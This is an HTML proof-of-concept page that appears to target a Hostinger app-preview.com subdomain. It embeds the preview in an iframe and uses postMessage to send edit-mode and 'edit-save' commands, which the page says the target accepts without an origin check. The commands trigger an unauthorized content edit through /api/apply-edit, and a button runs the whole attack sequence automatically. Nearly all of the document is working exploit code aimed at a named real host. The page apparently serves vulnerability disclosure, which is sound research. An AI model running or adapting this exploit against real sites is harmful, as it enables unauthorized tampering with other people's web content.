<!DOCTYPE html>
<html>
<head>
  <title>PoC - Hostinger app-preview postMessage no origin check</title>
  <style>
    body { font-family: monospace; background: #1a1a1a; color: #0f0; padding: 20px; }
    #log { background: #000; padding: 10px; height: 200px; overflow-y: auto; border: 1px solid #0f0; }
    iframe { width: 100%; height: 500px; border: 2px solid red; }
    button { background: #0f0; color: #000; border: none; padding: 8px 16px; margin: 4px; cursor: pointer; font-weight: bold; }
  </style>
</head>
<body>
  <h2>PoC: app-preview.com postMessage — no origin check</h2>
  <p>Origin of THIS page: <strong id="origin"></strong></p>
  <p>Target iframe: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong></p>

  <div>
    <button onclick="sendMsg('enable-edit-mode')">1. Send enable-edit-mode</button>
    <button onclick="sendMsg('enableSelectionMode')">2. Send enableSelectionMode</button>
    <button onclick="sendEditSave()">3. Send edit-save</button>
    <button onclick="sendMsg('disable-edit-mode')">4. Send disable-edit-mode</button>
    <button onclick="sendAll()">RUN ALL (auto)</button>
  </div>

  <div id="log"></div>

  <iframe id="target" src="https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/"></iframe>

  <script>
    document.getElementById('origin').textContent = window.location.origin;

    const log = (msg) => {
      const el = document.getElementById('log');
      const ts = new Date().toISOString().split('T')[1].slice(0,8);
      el.innerHTML += `[${ts}] ${msg}<br>`;
      el.scrollTop = el.scrollHeight;
      console.log('[POC]', msg);
    };

    const iframe = document.getElementById('target');

    function sendMsg(type, payload) {
      const msg = payload ? { type, payload } : { type };
      iframe.contentWindow.postMessage(msg, '*');
      log(`SENT → type="${type}" payload=${JSON.stringify(payload || null)}`);
    }

    function sendEditSave() {
      // Send edit-save - triggers handleEditSave() → POST /api/apply-edit
      sendMsg('edit-save', { newText: 'PWNED BY ATTACKER - postMessage no origin check' });
    }

    function sendAll() {
      log('--- Starting attack sequence ---');
      setTimeout(() => sendMsg('enable-edit-mode'), 500);
      setTimeout(() => sendMsg('enableSelectionMode'), 1500);
      setTimeout(() => sendEditSave(), 3000);
      setTimeout(() => {
        log('--- Sequence complete. Check /api/apply-edit in network tab ---');
      }, 3500);
    }

    // Listen for any messages coming BACK from the iframe
    window.addEventListener('message', (event) => {
      if (event.origin.includes('app-preview')) {
        log(`RECEIVED ← origin="${event.origin}" type="${event.data?.type}" data=${JSON.stringify(event.data).slice(0,200)}`);
      }
    });

    iframe.addEventListener('load', () => {
      log('iframe loaded ✓ — ready to send messages');
    });

    log('PoC loaded. Iframe embedding app-preview from foreign origin.');
    log('This origin is NOT in ALLOWED_PARENT_ORIGINS — but edit-save has no check!');
  </script>
</body>
</html>
